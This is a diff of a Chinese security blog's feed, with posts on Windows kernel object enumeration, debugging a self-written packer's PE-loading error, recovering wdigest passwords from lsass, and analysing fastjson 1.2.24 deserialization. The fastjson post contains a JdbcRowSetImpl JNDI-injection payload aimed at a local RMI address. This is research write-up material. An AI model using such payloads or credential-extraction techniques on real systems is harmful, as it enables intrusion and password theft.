+	&lt;span class=&quot;n&quot;&gt;PFN_NtOpenDirectoryObject&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pfnNtOpenDirectoryObject&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PFN_NtOpenDirectoryObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hNtdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;NtOpenDirectoryObject&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;PFN_RtlNtStatusToDosError&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pfnRtlNtStatusToDosError&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PFN_RtlNtStatusToDosError&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcAddress&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hNtdll&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;RtlNtStatusToDosError&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;UNICODE_STRING&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unicode_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;unicode_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USHORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;unicode_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MaximumLength&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;USHORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;unicode_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PWSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;OBJECT_ATTRIBUTES&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;path_attributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;InitializeObjectAttributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path_attributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+		&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unicode_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+		&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;// No Attributes&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// No Root Directory&lt;/span&gt;
+		&lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// No Security Descriptor&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;HANDLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;NTSTATUS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pfnNtOpenDirectoryObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;DIRECTORY_QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+		&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path_attributes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;PrintNtStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;ULONG&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;returnLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;POBJDIR_INFORMATION&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;POBJDIR_INFORMATION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUFFER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pfnNtQueryDirectoryObject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BUFFER_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;returnLength&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;wprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;L&quot;%d	%s	%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectTypeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATUS_NO_MORE_ENTRIES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;PrintNtStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;一些参考资料：&lt;/p&gt;
+
+&lt;p&gt;https://codemachine.com/articles/object_headers.html&lt;/p&gt;
+
+&lt;p&gt;https://stackoverflow.com/questions/2643084/sysinternals-winobj-device-listing-mechanism&lt;/p&gt;
+
+&lt;p&gt;https://github.com/adobe/chromium/blob/master/sandbox/tools/finder/finder_kernel.cc&lt;/p&gt;
+
+&lt;p&gt;https://rayanfam.com/topics/reversing-windows-internals-part1/&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;内核路漫漫。。。&lt;/p&gt;</content><author><name></name></author><category term="kernel" /><category term="windows" /><summary type="html">Windows Kernel Object的结构</summary></entry><entry><title type="html">调试PE装载过程——0xC000007B</title><link href="https://citrusice.github.io/posts/debugging-error-code-0xc000007b/" rel="alternate" type="text/html" title="调试PE装载过程——0xC000007B" /><published>2021-09-07T15:02:28+08:00</published><updated>2021-09-07T15:02:28+08:00</updated><id>https://citrusice.github.io/posts/debugging-error-code-0xc000007b</id><content type="html" xml:base="https://citrusice.github.io/posts/debugging-error-code-0xc000007b/">&lt;p&gt;自己写了个壳，对win10上一些程序加壳后发现程序无法运行，错误提示为0xC000007B，改来改去也找不到原因，于是准备调式一下，本文记录部分调试的过程以及思路。&lt;/p&gt;
 
 &lt;p&gt;0xC000007B很明显是一个NTSTATUS值，其对应的宏为STATUS_INVALID_IMAGE_FORMAT，这表明加壳后的PE文件对于操作系统来说是一个非法的PE文件，那么首先想到的就是在创建进程的过程中由于PE格式错误而导致进程创建失败。由于之前存在知识的误区，以为ntdll以及pe文件的装载是在内核中进行的，导致我调了半天NtCreateUserProcess。后来当我发现NtCreateUserProcess最终成功创建了进程之后我才醒悟，镜像的装载应该是在三环中由ntdll进行的。&lt;/p&gt;
 
@@ -1123,352 +1448,4 @@ r10=fffff8023a2b3428
 
 &lt;p&gt;因此只要找到lsasrv.dll存储于内存中的key我们就能够解密出wdigest中存储的用户密码&lt;/p&gt;
 
-&lt;p&gt;想要更好的使用工具或者开发自己的工具就需要深入了解其内部的机制&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">逆向从wdigest的SpAcceptCredentials开始，当使用windows账户凭据做认证时lsass将会调用这个函数。</summary></entry><entry><title type="html">fastjson 1.2.24反序列化过程学习</title><link href="https://citrusice.github.io/posts/fastjson-serialization-analisys/" rel="alternate" type="text/html" title="fastjson 1.2.24反序列化过程学习" /><published>2020-09-06T21:22:23+08:00</published><updated>2020-09-06T21:22:23+08:00</updated><id>https://citrusice.github.io/posts/fastjson-serialization-analisys</id><content type="html" xml:base="https://citrusice.github.io/posts/fastjson-serialization-analisys/">&lt;p&gt;本想系统的学学javaweb，但是一实习空闲时间就变得很少，所以还是先捡重要的看吧&lt;/p&gt;
-
-&lt;p&gt;分析组件的过程跟逆向过程挺像，不过好的地方是有源码作为参考，所以过程也更加轻松&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;调试用的代码&lt;/p&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;nc&quot;&gt;Group&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;group&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;JSON&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parseObject&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Group&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;从com.alibaba.fastjson.JSON#parseObject看起，首先实例化了一个DefaultJSONParser，而在实例化DefaultJSONParser的过程中又先实例化了一个JSONScanner，所以先看JSONScanner&lt;/p&gt;
-
-&lt;h2 id=&quot;jsonscanner&quot;&gt;JSONScanner&lt;/h2&gt;
-
-&lt;p&gt;JSONScanner继承抽象类JSONLexerBase，作为lexer放在DefaultJSONParser内部&lt;/p&gt;
-
-&lt;p&gt;JSONLexerBase有几个成员变量&lt;/p&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;pos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;features&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;                           &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//当前指向的位置&lt;/span&gt;
-
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;eofPos&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;cm&quot;&gt;/**
-     * A character buffer for literals.
-     */&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;                         &lt;span class=&quot;n&quot;&gt;sbuf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;sp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-
-    &lt;span class=&quot;cm&quot;&gt;/**
-     * number start position
-     */&lt;/span&gt;
-    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                            &lt;span class=&quot;n&quot;&gt;np&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;同时JSONScanner也新定义了两个&lt;/p&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//反序列化的字符串&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;//字符串长度&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//将bp指针指向下一个字符，如果到末尾则返回eoi，否则返回当前指向的字符   &lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-            &lt;span class=&quot;no&quot;&gt;EOI&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
-            &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;charAt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;));&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;JSONScanner的初始化&lt;/p&gt;
-
-&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JSONScanner&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;features&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
-        &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;features&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;len&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;bp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
-
-        &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;65279&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// utf-8 bom&lt;/span&gt;
-            &lt;span class=&quot;n&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;defaultjsonparser&quot;&gt;DefaultJSONParser&lt;/h2&gt;
-
-&lt;p&gt;不太好总结是干什么的，JSON的解析都在这个类中进行，在DefaultJSONParser初始化后fastjson调用其parseObject方法进行反序列化&lt;/p&gt;
-
-&lt;p&gt;在com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.lang.reflect.Type, java.lang.Object)中会获取要反序列化的类所对应的deserializer，如果没有则进行创建&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801153731844.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;进入这个函数&lt;/p&gt;
-
